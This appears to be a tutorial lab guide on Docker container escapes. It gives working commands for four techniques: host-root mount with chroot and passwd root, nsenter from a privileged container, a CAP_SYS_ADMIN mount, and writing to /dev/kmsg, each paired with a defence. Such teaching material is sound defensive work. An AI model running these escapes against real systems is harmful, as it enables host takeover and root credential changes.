# 🧪 Lab Series: Container Escape with Docker (Educational Use Only)

> ⚠️ WARNING: These labs are for educational and defensive purposes only.  
> Run them **only in isolated, non-production environments** like VMs or lab systems.

## 🎯 Objective
Learn how insecure Docker configurations can lead to container escapes and host compromise — and how to prevent them.

---

## 🧰 Prerequisites

- A Linux VM (never your main host!)
- Docker installed
- Root access
- Tools: `gcc`, `make`, `procps`, `util-linux`

```bash
sudo apt update
sudo apt install gcc make procps util-linux -y
```

---

## 🔹 Lab 1: Host Mount Escape via `-v /:/host`

### Step 1: Run a container with full host access

```bash
docker run -it --rm --privileged -v /:/host ubuntu bash
```

### Step 2: Simulate host access

```bash
chroot /host bash
passwd root  # Example, do not use on real systems
```

✅ **Expected:** Full host access.

🧠 **Defense:** Never mount `/`, use strict volume policies.

---

## 🔹 Lab 2: Escape via `--privileged` and `/proc`

### Step 1: Start a privileged container

```bash
docker run -it --rm --privileged ubuntu bash
```

### Step 2: Enter host namespaces

```bash
nsenter --target 1 --mount --uts --ipc --net --pid
```

✅ **Expected:** You are now in the host’s namespaces.

🧠 **Defense:** Avoid `--privileged`, use minimal capabilities.

---

## 🔹 Lab 3: Simulated Kernel Escape via `CAP_SYS_ADMIN`

> This does **not** run a real exploit, but shows how dangerous capabilities can be.

### Step 1: Launch container with high privileges

```bash
docker run -it --rm --cap-add=SYS_ADMIN ubuntu bash
```

### Step 2: Try sensitive operations

```bash
mount -t proc proc /mnt
```

✅ **Expected:** You have low-level kernel control.

🧠 **Defense:** Drop all unnecessary capabilities.

---

## 🔹 Lab 4: Escape via Host Devices

### Step 1: Run container with device access

```bash
docker run -it --rm --privileged --device /dev/kmsg ubuntu bash
```

### Step 2: Write to kernel logs

```bash
echo "MESSAGE FROM CONTAINER" > /dev/kmsg
```

✅ **Expected:** Writes to host kernel logs.

🧠 **Defense:** Do not expose host devices unless absolutely needed.

---

## ✅ Wrap-Up

- **What you learned:**
    - How misconfigurations can lead to escapes
    - Common escape vectors: privileged mode, host mounts, capabilities
    - Defense-in-depth: drop caps, limit mounts, audit configs

- **Best practices:**
    - Never use `--privileged` unless critical
    - Use security profiles (AppArmor, seccomp)
    - Use namespaces and rootless containers
    - Audit Dockerfiles and runtime flags

---